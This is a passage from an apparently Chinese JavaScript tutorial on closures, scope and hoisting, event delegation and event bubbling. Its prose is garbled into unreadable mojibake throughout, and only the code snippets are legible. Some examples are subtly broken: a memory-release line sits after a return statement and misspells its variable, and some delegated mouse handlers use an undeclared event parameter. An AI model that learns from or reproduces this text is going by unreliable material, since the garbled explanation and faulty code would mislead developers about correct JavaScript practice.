æˆç½‘é¡µçš„æ€§èƒ½é—®é¢˜ï¼Œåœ¨IEä¸­å¯èƒ½å¯¼è‡´å†…å­˜æ³„éœ²ã€‚è§£å†³æ–¹æ³•æ˜¯ï¼Œåœ¨é€€å‡ºå‡½æ•°ä¹‹å‰ï¼Œå°†ä¸ä½¿ç”¨çš„å±€éƒ¨å˜é‡å…¨éƒ¨åˆ é™¤ã€‚ ï¼ˆ2ï¼‰é—­åŒ…ä¼šåœ¨çˆ¶å‡½æ•°å¤–éƒ¨ï¼Œæ”¹å˜çˆ¶å‡½æ•°å†…éƒ¨å˜é‡çš„å€¼ã€‚æ‰€ä»¥ï¼Œå¦‚æžœä½ æŠŠçˆ¶å‡½æ•°å½“ä½œå¯¹è±¡ï¼ˆobjectï¼‰ä½¿ç”¨ï¼ŒæŠŠé—­åŒ…å½“ä½œå®ƒçš„å…¬ç”¨æ–¹æ³•ï¼ˆPublic Methodï¼‰ï¼ŒæŠŠå†…éƒ¨å˜é‡å½“ä½œå®ƒçš„ç§æœ‰å±žæ€§ï¼ˆprivate valueï¼‰ï¼Œè¿™æ—¶ä¸€å®šè¦å°å¿ƒï¼Œä¸è¦éšä¾¿æ”¹å˜çˆ¶å‡½æ•°å†…éƒ¨å˜é‡çš„å€¼ã€‚ ä¾‹å­ï¼š 12345678910111213function Cars()&#123; this.name = "Benz"; this.color = ["white","black"];&#125;Cars.prototype.sayColor = function()&#123; var outer = this; return function()&#123; return outer.color &#125;;&#125;; var instance = new Cars();console.log(instance.sayColor()()) æ”¹é€ ï¼š 1234567891011121314function Cars()&#123; this.name = "Benz"; this.color = ["white","black"];&#125;Cars.prototype.sayColor = function()&#123; var outerColor = this.color; //ä¿å­˜ä¸€ä¸ªå‰¯æœ¬åˆ°å˜é‡ä¸­ return function()&#123; return outerColor; //åº”ç”¨è¿™ä¸ªå‰¯æœ¬ &#125;; outColor = null; //é‡Šæ”¾å†…å­˜&#125;; var instance = new Cars();console.log(instance.sayColor()()) ä½œç”¨åŸŸåœ¨JSå½“ä¸­ä¸€ä¸ªå˜é‡çš„ä½œç”¨åŸŸï¼ˆscopeï¼‰æ˜¯ç¨‹åºä¸­å®šä¹‰è¿™ä¸ªå˜é‡çš„åŒºåŸŸã€‚å˜é‡åˆ†ä¸ºä¸¤ç±»ï¼šå…¨å±€ï¼ˆglobalï¼‰çš„å’Œå±€éƒ¨çš„ã€‚å…¶ä¸­å…¨å±€å˜é‡çš„ä½œç”¨åŸŸæ˜¯å…¨å±€æ€§çš„ï¼Œå³åœ¨JavaScriptä»£ç ä¸­ï¼Œå®ƒå¤„å¤„éƒ½æœ‰å®šä¹‰ã€‚è€Œåœ¨å‡½æ•°ä¹‹å†…å£°æ˜Žçš„å˜é‡ï¼Œå°±åªåœ¨å‡½æ•°ä½“å†…éƒ¨æœ‰å®šä¹‰ã€‚å®ƒä»¬æ˜¯å±€éƒ¨å˜é‡ï¼Œä½œç”¨åŸŸæ˜¯å±€éƒ¨æ€§çš„ã€‚å‡½æ•°çš„å‚æ•°ä¹Ÿæ˜¯å±€éƒ¨å˜é‡ï¼Œå®ƒä»¬åªåœ¨å‡½æ•°ä½“å†…éƒ¨æœ‰å®šä¹‰ã€‚ æˆ‘ä»¬å¯ä»¥å€ŸåŠ©JavaScriptçš„ä½œç”¨åŸŸé“¾ï¼ˆscope chainï¼‰æ›´å¥½åœ°äº†è§£å˜é‡çš„ä½œç”¨åŸŸã€‚æ¯ä¸ªJavaScriptæ‰§è¡ŒçŽ¯å¢ƒéƒ½æœ‰ä¸€ä¸ªå’Œå®ƒå…³è”åœ¨ä¸€èµ·çš„ä½œç”¨åŸŸé“¾ã€‚è¿™ä¸ªä½œç”¨åŸŸé“¾æ˜¯ä¸€ä¸ªå¯¹è±¡åˆ—è¡¨æˆ–å¯¹è±¡é“¾ã€‚å½“JavaScriptä»£ç éœ€è¦æŸ¥è¯¢å˜é‡xçš„å€¼æ—¶ï¼ˆè¿™ä¸ªè¿‡ç¨‹å«åšå˜é‡è§£æžï¼ˆvariable name resolutionï¼‰ï¼‰ï¼Œå®ƒå°±å¼€å§‹æŸ¥çœ‹è¯¥é“¾çš„ç¬¬ä¸€ä¸ªå¯¹è±¡ã€‚å¦‚æžœé‚£ä¸ªå¯¹è±¡æœ‰ä¸€ä¸ªåä¸ºxçš„å±žæ€§ï¼Œé‚£ä¹ˆå°±é‡‡ç”¨é‚£ä¸ªå±žæ€§çš„å€¼ã€‚å¦‚æžœç¬¬ä¸€ä¸ªå¯¹è±¡æ²¡æœ‰åä¸ºxçš„å±žæ€§ï¼ŒJavaScriptå°±ä¼šç»§ç»­æŸ¥è¯¢é“¾ä¸­çš„ç¬¬äºŒä¸ªå¯¹è±¡ã€‚å¦‚æžœç¬¬äºŒä¸ªå¯¹è±¡ä»ç„¶æ²¡æœ‰åä¸ºxçš„å±žæ€§ï¼Œé‚£ä¹ˆå°±ç»§ç»­æŸ¥è¯¢ä¸‹ä¸€ä¸ªå¯¹è±¡ï¼Œä»¥æ­¤ç±»æŽ¨ã€‚å¦‚æžœæŸ¥è¯¢åˆ°æœ€åŽï¼ˆæŒ‡é¡¶å±‚ä»£ç ä¸­ï¼‰ä¸å­˜åœ¨è¿™ä¸ªå±žæ€§ï¼Œé‚£ä¹ˆè¿™ä¸ªå˜é‡çš„å€¼å°±æ˜¯æœªå®šä¹‰çš„ã€‚ 12345678910var a,b;(function()&#123; alert(a); // undefined alert(b); // undefined var a = b = 3; alert(a); // 3 alert(b); // 3&#125;)(); alert(a); // undefined alert(b); // 3 ä»¥ä¸Šä»£ç ç›¸å½“äºŽ 12345678910var a,b;(function()&#123; alert(a); alert(b); var a = 3; b = 3; alert(a); alert(b);&#125;)(); alert(a); äº‹ä»¶å§”æ‰˜æ˜¯ä»€ä¹ˆï¼Ÿæ¦‚è¿° ä»€ä¹ˆå«åšäº‹ä»¶å§”æ‰˜ï¼Œåˆ«åå«äº‹ä»¶ä»£ç†ï¼ŒJavaScript é«˜çº§ç¨‹åºè®¾è®¡ä¸Šè®²ã€‚äº‹ä»¶å§”æ‰˜å°±æ˜¯åˆ©ç”¨äº‹ä»¶å†’æ³¡ï¼ŒåªæŒ‡å®šä¸€ä¸ªäº‹ä»¶å¤„ç†ç¨‹åºï¼Œå°±å¯ä»¥ç®¡ç†æŸä¸€ç±»åž‹çš„æ‰€æœ‰äº‹ä»¶ã€‚ å®žé™…ä¾‹å­ï¼š æœ‰ä¸‰ä¸ªåŒäº‹é¢„è®¡ä¼šåœ¨å‘¨ä¸€æ”¶åˆ°å¿«é€’ï¼Œä¸ºç­¾æ”¶å¿«é€’ï¼Œæœ‰ä¸¤ç§æ–¹æ³•ï¼šä¸€æ˜¯ä¸‰ä¸ªäººåœ¨å…¬å¸é—¨å£ç­‰å¿«é€’ï¼ŒäºŒæ˜¯å§”æ‰˜ç»™å‰å°çš„å°å§ä»£ä¸ºç­¾æ”¶ã€‚çŽ°å®žç”Ÿæ´»ä¸­ï¼Œæˆ‘ä»¬å¤§å¤šé‡‡ç”¨å§”æ‰˜çš„æ–¹æ¡ˆï¼ˆå…¬å¸ä¹Ÿä¸ä¼šå®¹å¿é‚£ä¹ˆå¤šäººç«™åœ¨é—¨å£ï¼‰ã€‚å‰å°å°å§æ”¶åˆ°å¿«é€’åŽï¼Œä¼šåˆ¤æ–­æ”¶ä»¶äººæ˜¯è°ï¼ŒæŒ‰ç…§æ”¶ä»¶äººçš„è¦æ±‚ç­¾æ”¶ï¼Œç”šè‡³æ˜¯ä»£ä»˜ã€‚è¿™ç§æ–¹æ¡ˆè¿˜æœ‰ä¸€ä¸ªå¥½å¤„å°±æ˜¯ï¼Œå³ä½¿å…¬å¸æ¥äº†å¾ˆå¤šæ–°å‘˜å·¥ï¼ˆä¸ç®¡å¤šå°‘ï¼‰ï¼Œå‰å°å°å§ä¹Ÿä¼šåœ¨æ”¶åˆ°å¯„ç»™æ–°å‘˜å·¥ä»¬çš„å¿«é€’åŽæ ¸å®žä»£ä¸ºç­¾æ”¶ã€‚ è¿™é‡Œæœ‰2å±‚æ„æ€ï¼šç¬¬ä¸€ã€çŽ°åœ¨å§”æ‰˜å‰å°çš„å°å§æ˜¯å¯ä»¥ä»£ä¸ºç­¾æ”¶çš„ï¼Œå³ç¨‹åºä¸­çš„çŽ°æœ‰çš„ DOM èŠ‚ç‚¹æ˜¯æœ‰äº‹ä»¶çš„ã€‚ ç¬¬äºŒã€æ–°å‘˜å·¥ä¹Ÿå¯ä»¥è¢«å‰å°å°å§ä»£ä¸ºç­¾æ”¶ï¼Œå³ç¨‹åºä¸­æ–°æ·»åŠ çš„ DOM èŠ‚ç‚¹ä¹Ÿæ˜¯æœ‰äº‹ä»¶çš„ã€‚ ä¸ºä»€ä¹ˆè¦ä½¿ç”¨äº‹ä»¶å§”æ‰˜ ä¸€èˆ¬æ¥è¯´ï¼ŒDOM éœ€è¦æœ‰äº‹ä»¶å¤„ç†ç¨‹åºï¼Œå°±ä¼šç›´æŽ¥ç»™å®ƒè®¾å¤„ç†ç¨‹åºï¼Œä½†æ˜¯å¦‚æžœæ˜¯å¾ˆå¤š DOM éœ€è¦æ·»åŠ å¤„ç†äº‹ä»¶å‘¢ï¼Ÿä¾‹å¦‚æˆ‘ä»¬æœ‰100ä¸ª liï¼Œæ¯ä¸ª li éƒ½æœ‰ç›¸åŒçš„ click ç‚¹å‡»äº‹ä»¶ï¼Œå¯èƒ½æˆ‘ä»¬ä¼šç”¨åˆ° for å¾ªçŽ¯ï¼Œæ¥éåŽ†æ‰€æœ‰ li ,ç„¶åŽç»™å®ƒä»¬æ·»åŠ äº‹ä»¶ï¼Œé‚£ä¹ˆä¼šå­˜åœ¨ä»€ä¹ˆæ ·çš„é—®é¢˜ï¼Ÿ åœ¨ JavsScript ä¸­ï¼Œæ·»åŠ åˆ°é¡µé¢ä¸Šçš„äº‹ä»¶å¤„ç†ç¨‹åºæ•°é‡å°†ç›´æŽ¥å½±å“åˆ°æ•´ä½“è¿è¡Œæ€§èƒ½ï¼Œå› ä¸ºéœ€è¦ä¸æ–­åœ°ä¸Ž DOM è¿›è¡Œäº¤äº’ï¼Œè®¿é—® DOM çš„æ¬¡æ•°è¶Šå¤šï¼Œå¼•èµ·æµè§ˆå™¨é‡ç»˜ä¸Žé‡æŽ’çš„æ¬¡æ•°ä¹Ÿå°±è¶Šå¤šï¼Œå°±ä¼šå»¶é•¿æ•´ä¸ªé¡µé¢çš„äº¤äº’å°±ç»ªæ—¶é—´ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ€§èƒ½ä¼˜åŒ–çš„ä¸»è¦æ€æƒ³ä¹‹ä¸€å°±æ˜¯å‡å°‘ DOM æ“ä½œçš„åŽŸå› ã€å¦‚æžœè¦ç”¨åˆ°äº‹ä»¶å§”æ‰˜ï¼Œå°±ä¼šå°†æ‰€æœ‰çš„æ“ä½œéƒ½æ”¾åœ¨ js ç¨‹åºé‡Œé¢ï¼Œä¸Ž DOM çš„æ“ä½œå°±åªéœ€è¦äº¤äº’ä¸€æ¬¡ï¼Œè¿™æ ·å°±å¯ä»¥å¤§å¤§å‡å°‘ä¸Ž DOM çš„äº¤äº’æ¬¡æ•°ï¼Œæé«˜æ€§èƒ½ã€‚ æ¯ä¸ªå‡½æ•°éƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ˜¯å¯¹è±¡å°±ä¼šå ç”¨å†…å­˜ï¼Œå¯¹è±¡è¶Šå¤šï¼Œå†…å­˜å ç”¨çŽ‡å°±è¶Šå¤§ï¼Œè‡ªç„¶æ€§èƒ½å°±è¶Šå·®äº†ï¼ˆå†…å­˜ä¸å¤Ÿç”¨ï¼Œæ˜¯ç¡¬ä¼¤ï¼Œå“ˆå“ˆï¼‰ï¼Œæ¯”å¦‚ä¸Šé¢çš„100ä¸ªliï¼Œå°±è¦å ç”¨100ä¸ªå†…å­˜ç©ºé—´ï¼Œå¦‚æžœæ˜¯1000ä¸ªï¼Œ10000ä¸ªå‘¢ï¼Œé‚£åªèƒ½è¯´å‘µå‘µäº†ï¼Œå¦‚æžœç”¨äº‹ä»¶å§”æ‰˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åªå¯¹å®ƒçš„çˆ¶çº§ï¼ˆå¦‚æžœåªæœ‰ä¸€ä¸ªçˆ¶çº§ï¼‰è¿™ä¸€ä¸ªå¯¹è±¡è¿›è¡Œæ“ä½œï¼Œè¿™æ ·æˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªå†…å­˜ç©ºé—´å°±å¤Ÿäº†ï¼Œæ˜¯ä¸æ˜¯çœäº†å¾ˆå¤šï¼Œè‡ªç„¶æ€§èƒ½å°±ä¼šæ›´å¥½ã€‚ äº‹ä»¶å§”æ‰˜çš„åŽŸç† äº‹ä»¶å§”æ‰˜æ˜¯åˆ©ç”¨äº‹ä»¶çš„å†’æ³¡åŽŸç†æ¥å®žçŽ°çš„ï¼Œä½•ä¸ºäº‹ä»¶å†’æ³¡ï¼Ÿå°±æ˜¯äº‹ä»¶ä»Žæœ€æ·±çš„èŠ‚ç‚¹å¼€å§‹æ‰§è¡Œï¼Œç„¶åŽé€æ­¥å‘ä¸Šä¼ æ’­äº‹ä»¶ï¼Œä¾‹å­ï¼š é¡µé¢ä¸Šæœ‰ä¸€ä¸ªèŠ‚ç‚¹æ ‘ï¼Œdiv&gt;ul&gt;li&gt;aï¼Œæ¯”å¦‚ç»™æœ€é‡Œé¢çš„ a åŠ ä¸€ä¸ª click ç‚¹å‡»äº‹ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªäº‹ä»¶å°±ä¼šä¸€å±‚ä¸€å±‚çš„å¾€å¤–æ‰§è¡Œï¼Œæ‰§è¡Œé¡ºåº a&gt;li&gt;ul&gt;divï¼Œæœ‰è¿™ä¹ˆä¸€ä¸ªæœºåˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç»™æœ€å¤–é¢çš„ div åŠ ç‚¹å‡»äº‹ä»¶ï¼Œé‚£ä¹ˆé‡Œé¢çš„ ul,li,a åšç‚¹å‡»äº‹ä»¶çš„æ—¶å€™ï¼Œéƒ½ä¼šå†’æ³¡åˆ°æœ€å¤–å±‚çš„ div ä¸Šé¢ï¼Œéƒ½ä¼šè§¦å‘ï¼Œè¿™å°±æ˜¯äº‹ä»¶å§”æ‰˜ï¼Œå§”æ‰˜ä»–ä»¬çˆ¶çº§ä»£ä¸ºæ‰§è¡Œäº‹ä»¶ã€‚ äº‹ä»¶å§”æ‰˜æ€Žä¹ˆå®žçŽ° 123456&lt;ul id="ul"&gt; &lt;li&gt;111&lt;/li&gt; &lt;li&gt;222&lt;/li&gt; &lt;li&gt;333&lt;/li&gt; &lt;li&gt;444&lt;/li&gt;&lt;/ul&gt; å®žçŽ°åŠŸèƒ½æ˜¯ç‚¹å‡»liï¼Œå¼¹å‡º123ï¼š 123456789window.onload = function()&#123; var oUl = document.getElementById('ul'); var aLi = oUl.getElementsByTagName('li'); for(var i = 0; i &lt; aLi.length; i++)&#123; aLi[i].onclick = function()&#123; alert(123); &#125; &#125;&#125; ä¸Šé¢çš„ä»£ç çš„æ„æ€å¾ˆç®€å•ï¼Œç›¸ä¿¡å¾ˆå¤šäººéƒ½æ˜¯è¿™ä¹ˆå®žçŽ°çš„ï¼Œæˆ‘ä»¬çœ‹çœ‹æœ‰å¤šå°‘æ¬¡çš„domæ“ä½œï¼Œé¦–å…ˆè¦æ‰¾åˆ°ulï¼Œç„¶åŽéåŽ†liï¼Œç„¶åŽç‚¹å‡»liçš„æ—¶å€™ï¼Œåˆè¦æ‰¾ä¸€æ¬¡ç›®æ ‡çš„liçš„ä½ç½®ï¼Œæ‰èƒ½æ‰§è¡Œæœ€åŽçš„æ“ä½œï¼Œæ¯æ¬¡ç‚¹å‡»éƒ½è¦æ‰¾ä¸€æ¬¡liï¼› é‚£ä¹ˆæˆ‘ä»¬ç”¨äº‹ä»¶å§”æ‰˜çš„æ–¹å¼åšåˆä¼šæ€Žä¹ˆæ ·å‘¢ï¼Ÿ 123456window.onload = function()&#123; var oUl = document.getElementById('ul'); oUl.onclick = function()&#123; alert(123); &#125;&#125; è¿™é‡Œç”¨çˆ¶çº§ulåšäº‹ä»¶å¤„ç†ï¼Œå½“liè¢«ç‚¹å‡»æ—¶ï¼Œç”±äºŽå†’æ³¡åŽŸç†ï¼Œäº‹ä»¶å°±ä¼šå†’æ³¡åˆ°ulä¸Šï¼Œå› ä¸ºulä¸Šæœ‰ç‚¹å‡»äº‹ä»¶ï¼Œæ‰€ä»¥äº‹ä»¶å°±ä¼šè§¦å‘ï¼Œå½“ç„¶ï¼Œè¿™é‡Œå½“ç‚¹å‡»ulçš„æ—¶å€™ï¼Œä¹Ÿæ˜¯ä¼šè§¦å‘çš„ï¼Œé‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼Œå¦‚æžœæˆ‘æƒ³è®©äº‹ä»¶ä»£ç†çš„æ•ˆæžœè·Ÿç›´æŽ¥ç»™èŠ‚ç‚¹çš„äº‹ä»¶æ•ˆæžœä¸€æ ·æ€Žä¹ˆåŠžï¼Œæ¯”å¦‚è¯´åªæœ‰ç‚¹å‡»liæ‰ä¼šè§¦å‘ï¼Œä¸æ€•ï¼Œæˆ‘ä»¬æœ‰ç»æ‹›ï¼š Eventå¯¹è±¡æä¾›äº†ä¸€ä¸ªå±žæ€§å«targetï¼Œå¯ä»¥è¿”å›žäº‹ä»¶çš„ç›®æ ‡èŠ‚ç‚¹ï¼Œæˆ‘ä»¬æˆä¸ºäº‹ä»¶æºï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œtargetå°±å¯ä»¥è¡¨ç¤ºä¸ºå½“å‰çš„äº‹ä»¶æ“ä½œçš„domï¼Œä½†æ˜¯ä¸æ˜¯çœŸæ­£æ“ä½œdomï¼Œå½“ç„¶ï¼Œè¿™ä¸ªæ˜¯æœ‰å…¼å®¹æ€§çš„ï¼Œæ ‡å‡†æµè§ˆå™¨ç”¨ev.targetï¼ŒIEæµè§ˆå™¨ç”¨event.srcElementï¼Œæ­¤æ—¶åªæ˜¯èŽ·å–äº†å½“å‰èŠ‚ç‚¹çš„ä½ç½®ï¼Œå¹¶ä¸çŸ¥é“æ˜¯ä»€ä¹ˆèŠ‚ç‚¹åç§°ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨nodeNameæ¥èŽ·å–å…·ä½“æ˜¯ä»€ä¹ˆæ ‡ç­¾åï¼Œè¿™ä¸ªè¿”å›žçš„æ˜¯ä¸€ä¸ªå¤§å†™çš„ï¼Œæˆ‘ä»¬éœ€è¦è½¬æˆå°å†™å†åšæ¯”è¾ƒï¼ˆä¹ æƒ¯é—®é¢˜ï¼‰ï¼š 12345678910window.onload = function()&#123; var oUl = document.getElementById("ul"); oUl.onclick = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == "li")&#123; alert(target.innerHTML); &#125; &#125;&#125; è¿™æ ·æ”¹ä¸‹å°±åªæœ‰ç‚¹å‡»liä¼šè§¦å‘äº‹ä»¶äº†ï¼Œä¸”æ¯æ¬¡åªæ‰§è¡Œä¸€æ¬¡domæ“ä½œï¼Œå¦‚æžœliæ•°é‡å¾ˆå¤šçš„è¯ï¼Œå°†å¤§å¤§å‡å°‘domçš„æ“ä½œï¼Œä¼˜åŒ–çš„æ€§èƒ½å¯æƒ³è€ŒçŸ¥ï¼ ä¸Šé¢çš„ä¾‹å­æ˜¯è¯´liæ“ä½œçš„æ˜¯åŒæ ·çš„æ•ˆæžœï¼Œè¦æ˜¯æ¯ä¸ªliè¢«ç‚¹å‡»çš„æ•ˆæžœéƒ½ä¸ä¸€æ ·ï¼Œé‚£ä¹ˆç”¨äº‹ä»¶å§”æ‰˜è¿˜æœ‰ç”¨å—ï¼Ÿ 12345678910111213141516var Add = document.getElementById("add");var Remove = document.getElementById("remove");var Move = document.getElementById("move");var Select = document.getElementById("select");Add.onclick = function()&#123; alert('æ·»åŠ ');&#125;;Remove.onclick = function()&#123; alert('åˆ é™¤');&#125;;Move.onclick = function()&#123; alert('ç§»åŠ¨');&#125;;Select.onclick = function()&#123; alert('é€‰æ‹©');&#125; ä¸Šé¢å®žçŽ°çš„æ•ˆæžœæˆ‘å°±ä¸å¤šè¯´äº†ï¼Œå¾ˆç®€å•ï¼Œ4ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»æ¯ä¸€ä¸ªåšä¸åŒçš„æ“ä½œï¼Œé‚£ä¹ˆè‡³å°‘éœ€è¦4æ¬¡domæ“ä½œï¼Œå¦‚æžœç”¨äº‹ä»¶å§”æ‰˜ï¼Œèƒ½è¿›è¡Œä¼˜åŒ–å—ï¼Ÿ 123456789101112131415161718192021222324var oBox = document.getElementById("box");oBox.onclick = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'input')&#123; switch(target.id) &#123; case 'add': alert('æ·»åŠ '); break; case 'remove': alert('åˆ é™¤'); break; case 'move': alert('ç§»åŠ¨'); break; case 'select': alert('é€‰æ‹©'); break; default : alert('ä¸šåŠ¡é”™è¯¯'); break; &#125; &#125;&#125; ç”¨äº‹ä»¶å§”æ‰˜å°±å¯ä»¥åªç”¨ä¸€æ¬¡domæ“ä½œå°±èƒ½å®Œæˆæ‰€æœ‰çš„æ•ˆæžœï¼Œæ¯”ä¸Šé¢çš„æ€§èƒ½è‚¯å®šæ˜¯è¦å¥½ä¸€äº›çš„ çŽ°åœ¨è®²çš„éƒ½æ˜¯documentåŠ è½½å®Œæˆçš„çŽ°æœ‰domèŠ‚ç‚¹ä¸‹çš„æ“ä½œï¼Œé‚£ä¹ˆå¦‚æžœæ˜¯æ–°å¢žçš„èŠ‚ç‚¹ï¼Œæ–°å¢žçš„èŠ‚ç‚¹ä¼šæœ‰äº‹ä»¶å—ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªæ–°å‘˜å·¥æ¥äº†ï¼Œä»–èƒ½æ”¶åˆ°å¿«é€’å—ï¼Ÿ 1234567&lt;input type="button" name="" id="btn" value="æ·»åŠ " /&gt;&lt;ul id="ul1"&gt; &lt;li&gt;111&lt;/li&gt; &lt;li&gt;222&lt;/li&gt; &lt;li&gt;333&lt;/li&gt; &lt;li&gt;444&lt;/li&gt;&lt;/ul&gt; çŽ°åœ¨æ˜¯ç§»å…¥liï¼Œliå˜çº¢ï¼Œç§»å‡ºliï¼Œliå˜ç™½ï¼Œè¿™ä¹ˆä¸€ä¸ªæ•ˆæžœï¼Œç„¶åŽç‚¹å‡»æŒ‰é’®ï¼Œå¯ä»¥å‘ulä¸­æ·»åŠ ä¸€ä¸ªliå­èŠ‚ç‚¹ 123456789101112131415161718192021222324window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul"); var aLi = oUl.getElementsByTagName("li"); var num = 4; // é¼ æ ‡ç§»å…¥å˜çº¢ï¼Œç§»å‡ºå˜ç™½ for(var i = 0; i &lt; aLi.length; i++)&#123; aLi[i].onmouseover = function()&#123; this.style.background = 'red'; &#125; aLi[i].onmouseout = function()&#123; this.style.background = '#fff'; &#125; &#125; // æ–°å¢žèŠ‚ç‚¹ oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111 * num; oUl.appendChild(oLi); &#125;&#125; è¿™æ˜¯ä¸€èˆ¬çš„åšæ³•ï¼Œä½†æ˜¯ä½ ä¼šå‘çŽ°ï¼Œæ–°å¢žçš„liæ˜¯æ²¡æœ‰äº‹ä»¶çš„ï¼Œè¯´æ˜Žæ·»åŠ å­èŠ‚ç‚¹çš„æ—¶å€™ï¼Œäº‹ä»¶æ²¡æœ‰ä¸€èµ·æ·»åŠ è¿›åŽ»ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æžœï¼Œé‚£æ€Žä¹ˆåšå‘¢ï¼Ÿä¸€èˆ¬çš„è§£å†³æ–¹æ¡ˆä¼šæ˜¯è¿™æ ·ï¼Œå°†forå¾ªçŽ¯ç”¨ä¸€ä¸ªå‡½æ•°åŒ…èµ·æ¥ï¼Œå‘½åä¸ºmHoverï¼Œå¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829// å°†é¼ æ ‡ç§»å‡ºç§»å…¥åŒ…è£…ä¸ºä¸€ä¸ªå‡½æ•°window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul"); var aLi = oUl.getElementsByTagName("li"); var num = 4; // é¼ æ ‡ç§»å…¥å˜çº¢ï¼Œç§»å‡ºå˜ç™½ function mHover()&#123; for(var i = 0; i &lt; aLi.length; i++)&#123; aLi[i].onmouseover = function()&#123; this.style.background = 'red'; &#125; aLi[i].onmouseout = function()&#123; this.style.background = '#fff'; &#125; &#125; &#125; mHover(); // æ–°å¢žèŠ‚ç‚¹ oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111 * num; oUl.appendChild(oLi); mHover(); &#125;&#125; è™½ç„¶åŠŸèƒ½å®žçŽ°äº†ï¼Œçœ‹ç€è¿˜æŒºå¥½ï¼Œä½†å®žé™…ä¸Šæ— ç–‘æ˜¯åˆå¢žåŠ äº†ä¸€ä¸ªdomæ“ä½œï¼Œåœ¨ä¼˜åŒ–æ€§èƒ½æ–¹é¢æ˜¯ä¸å¯å–çš„ï¼Œé‚£ä¹ˆæœ‰äº‹ä»¶å§”æ‰˜çš„æ–¹å¼ï¼Œèƒ½åšåˆ°ä¼˜åŒ–å—ï¼Ÿ 12345678910111213141516171819202122232425262728293031window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul"); var aLi = oUl.getElementsByTagName("li"); var num = 4; // äº‹ä»¶å§”æ‰˜ é¼ æ ‡ç§»å…¥å˜çº¢ï¼Œç§»å‡ºå˜ç™½ // æ·»åŠ çš„å­å…ƒç´ ä¹Ÿæœ‰äº‹ä»¶ oUl.onmouseover = function()&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'li')&#123; target.style.background = 'red'; &#125; &#125; oUl.onmouseout = function()&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'li')&#123; target.style.background = '#fff'; &#125; &#125; // æ–°å¢žèŠ‚ç‚¹ oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111 * num; oUl.appendChild(oLi); &#125;&#125; å¦å¤–ä¸€ä¸ªæ€è€ƒçš„é—®é¢˜ çŽ°åœ¨ç»™ä¸€ä¸ªåœºæ™¯ ul &gt; li &gt; div &gt;pï¼Œdivå æ»¡liï¼Œpå æ»¡divï¼Œè¿˜æ˜¯ç»™ulç»‘å®šæ—¶é—´ï¼Œéœ€è¦åˆ¤æ–­ç‚¹å‡»çš„æ˜¯ä¸æ˜¯liï¼ˆå‡è®¾lié‡Œé¢çš„ç»“æž„æ˜¯ä¸å›ºå®šçš„ï¼‰ï¼Œé‚£ä¹ˆe.targetå°±å¯èƒ½æ˜¯pï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯divï¼Œè¿™ç§æƒ…å†µä½ ä¼šæ€Žä¹ˆå¤„ç†å‘¢ï¼Ÿ 1234567891011121314 &lt;ul id="test"&gt; &lt;li&gt; &lt;p&gt;11111111111&lt;/p&gt; &lt;/li&gt; &lt;li&gt; &lt;div&gt; 22222222 &lt;/div&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;3333333333&lt;/span&gt; &lt;/li&gt; &lt;li&gt;4444444&lt;/li&gt;&lt;/ul&gt; å¦‚ä¸Šåˆ—è¡¨ï¼Œæœ‰4ä¸ªliï¼Œé‡Œé¢çš„å†…å®¹å„ä¸ç›¸åŒï¼Œç‚¹å‡»liï¼Œeventå¯¹è±¡è‚¯å®šæ˜¯å½“å‰ç‚¹å‡»çš„å¯¹è±¡ï¼Œæ€Žä¹ˆæŒ‡å®šåˆ°liä¸Šï¼Œä¸‹é¢æˆ‘ç›´æŽ¥ç»™è§£å†³æ–¹æ¡ˆï¼š 1234567891011var oUl = document.getElementById('test');oUl.addEventListener('click',function(ev)&#123; var target = ev.target; while (target !== oUl) &#123; if(target.tagName.toLowerCase() == 'li')&#123; alert(target.innerHTML); break; &#125; target = target.parentNode; &#125;&#125;); å¦‚ä½•é˜»æ­¢äº‹ä»¶å†’æ³¡å’Œé»˜è®¤äº‹ä»¶åœ¨è§£ç­”è¿™ä¸ªé—®é¢˜ä¹‹å‰ï¼Œå…ˆæ¥çœ‹çœ‹äº‹ä»¶çš„æ‰§è¡Œé¡ºåº 12345&lt;div&gt; &lt;ul&gt; &lt;li&gt;å†’æ³¡/æ•èŽ·&lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; å®žä¾‹ï¼š 12345678910111213141516171819202122232425262728293031var html = document.documentElement;var body = document.body;var div = body.querySelector('div');var ul = body.querySelector('ul');var li = body.querySelector('li');// æ•èŽ·ul.addEventListener('click',captureCallback,true);li.addEventListener('click',captureCallback,true);div.addEventListener('click',captureCallback,true);body.addEventListener('click',captureCallback,true);html.addEventListener('click',captureCallback,true); // å†’æ³¡ul.addEventListener('click',bubblingCallback,false);li.addEventListener('click',bubblingCallback,false);div.addEventListener('click',bubblingCallback,false);body.addEventListener('click',bubblingCallback,false);html.addEventListener('click',bubblingCallback,false);function captureCallback(e)&#123; // e.stopPropagation(); var target = e.currentTarget; console.log(target.tagName);&#125; function bubblingCallback(e)&#123; // e.stopPropagation(); var target = e.currentTarget; 